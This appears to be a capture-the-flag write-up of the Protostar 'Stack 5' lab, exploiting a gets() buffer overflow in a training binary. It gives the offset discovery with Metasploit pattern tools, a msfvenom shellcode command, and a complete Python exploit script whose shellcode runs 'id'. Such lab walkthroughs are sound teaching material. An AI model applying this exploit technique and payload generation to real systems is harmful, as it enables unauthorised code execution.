# Stack 5

## About

Stack5 is a standard buffer overflow, this time introducing shellcode.

Hints
* At this point in time, it might be easier to use someone elses shellcode
* If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
* remove the int3s once your shellcode is done.

``` c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];
  
    gets(buffer);
	}
	
```

## Solution

So this time we have to make an full buffer overflow exploit. 

i started crafting the following script that i would fill out when i find the values 

``` python
#!/usr/bin/env python

junk =
retaddr =
shellcode =


exploit = junk + retaddr + shellcode
print(exploit)
```

right so lets find out how much junk is needed. 

like last time i use the metasploit pattern tools 

``` bash
[root:/opt/Data/5]# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100 > pattern
```

``` bash
[root:/opt/Data/5]# gdb ./stack5

pwndbg> run < pattern
```

and the segmentation fault is at `0x63413563`

ok now to find the offset 

``` bash 
[root:/opt/Data/5]# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x63413563
[*] Exact match at offset 76
```
right so i change the junk value in the script to 76 

for the return address i looks at the registers after the crash and examin the `ESP` value a bit more 

``` bash
*EAX  0xffffd890 ◂— 'Aa0Aa1Aa2Aa3Aa4...'
 EBX  0x0
 *ECX  0xfbad2088
 *EDX  0xf7fc587c (_IO_stdfile_0_lock) ◂— 0
 *EDI  0xf7fc4000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
 *ESI  0x1
 *EBP  0x41346341 ('Ac4A')
 *ESP  0xffffd8e0 ◂— '6Ac7Ac8Ac9Ad0Ad...'
 *EIP  0x63413563 ('c5Ac')
```

``` bash
pwndbg> x/10s $esp
0xffffd8e0:     "6Ac7Ac8Ac9Ad0Ad"...
0xffffd8ef:     "1Ad2A"
0xffffd8f5:     ""
0xffffd8f6:     ""
0xffffd8f7:     ""
0xffffd8f8:     ""
0xffffd8f9:     "@\374\367\004\334\377", <incomplete sequence \367>
0xffffd901:     "\320\377", <incomplete sequence \367>
0xffffd905:     ""
0xffffd906:     ""
```
ok so i can put `0xffffd8e0` as my return address, lets try the following to confirm 

``` bash
python -c 'print "A"* 76 + "B" * 4' > test 
```
and then look at it in gdb

``` bash
*EAX  0xffffd890 ◂— 'AAAAAAAAAAAAAAA...'
 EBX  0x0
 *ECX  0xfbad2088
 *EDX  0xf7fc587c (_IO_stdfile_0_lock) ◂— 0
 *EDI  0xf7fc4000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
 *ESI  0x1
 *EBP  0x41414141 ('AAAA')
 *ESP  0xffffd8e0 ◂— 0x0
 *EIP  0x42424242 ('BBBB')
```

ok looking good 

time for some shellcode, to generate the shellcode i use the following from msfvenom

``` bash
[root:/opt/Data/5]# msfvenom -p linux/x86/exec CMD=id --smallest -f python -b '\x00' -n 4 -v shellcode
```

and i update the script as follows 

``` python
#!/usr/bin/env python

junk = 'A'*76
retaddr = '\xe0\xd8\xff\xff' 
shellcode =  ""
shellcode += "\x4a\x98\x9b\x4a\x6a\x25\x59\xe8\xff\xff\xff\xff"
shellcode += "\xc1\x5e\x30\x4c\x0e\x07\xe2\xfa\x6b\x09\x5b\x9d"
shellcode += "\x57\x60\x6f\x25\x6a\x83\xec\x64\x22\x7d\x67\x10"
shellcode += "\x79\x3d\x71\x7d\x7b\x9f\xf4\x4a\xf1\x19\x1b\x1c"
shellcode += "\x1d\x77\x7b\x20\x76\x71\xaa\xc5\xe8\xa6"

exploit = junk + retaddr + shellcode
print(exploit)

```
ok, its show time, i generate the payload and then open it with gdb, i should see 2 processes in gdb

``` bash
[root:/opt/Data/5]# python ./5.py > exploit
```

``` bash
pwndbg> r <exploit
Starting program: /opt/Data/5/stack5 <exploit
process 23752 is executing new program: /bin/dash
[New process 23756]
process 23756 is executing new program: /usr/bin/id
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
uid=0(root) gid=0(root) groups=0(root)
[Inferior 2 (process 23756) exited normally]
```

There we have it, we command injection as the output of `id` was shown and 2 processes were executed ! 
